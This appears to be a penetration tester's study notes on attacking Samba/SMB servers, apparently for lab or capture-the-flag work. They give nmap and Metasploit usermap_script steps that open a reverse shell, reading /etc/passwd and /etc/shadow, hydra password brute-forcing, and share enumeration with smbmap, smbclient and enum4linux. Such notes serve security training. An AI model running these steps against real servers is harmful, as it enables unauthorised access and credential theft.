SMB is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local LAN

SMB uses port 445 (TCP) however originally SMB ran ontop of NetBIOS using poer 139

SAMBA is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

SAMBA utilizes user/pass auth in order to obtain access to the server or a network share.

We can perform a brute-force attack on the SAMBA server in order to obtain legit creds.

After obtaining legit creds, we can use a utility called SMBMap in order to enumerate SAMBA share drives, list the contents of the shares as well as download files and execute remote commands on the target.

We can utilize a tool called SMBclient, which is part of the SAMBA software suite. It communicates with a LAN manager server, offering an interface similar to that of the FTP program. It can be used to download files from the server to the local machine, upload files and also retrieve directory info from the server.

--------------------------------Exploitation-----------------------------------

nmap -sV <ip>
**identify samba, look for port 445, use auxiliary/scanner/smb/smb_version and searchsploit for exploits**
some samba versions like 3.0.20 - 3.0.25 are vulnerable to multi/samba/usermap_ script which provides a reverse tcp connection through msfconsole
to upgrade this session you want to background the session with the reverse connection then type sessions and then sessions -u 1 (or whatever the session id is)
cat /etc/passwd (users)
cat /etc/shadow (hashes typically in MD5)

hydra -l admin -P <password word list> <ip> <smb> (we can use this as a more aggressive form if no exploits are found)
**now we have creds we can switch and use smbmap**
smbmap -H <ip> -u admin -p <password> (show shares)
**we can use smbclient to actually access these shares, enum4linux is good if you have credentials**
smbclient -L <ip> -U <username>
smbclient //<ip>/<sharename> -U admin
help
dir
cd <wherever>
get flag
get flag.tar.gz
tar xzf flag.tar.gz (extracts flag from compressed file)

-------------------------------enum4linux------------------------------------

enum4linux -a <ip>
enum4linux -a -u admin -p <password> <ip> (enumerates all, but uses auth)

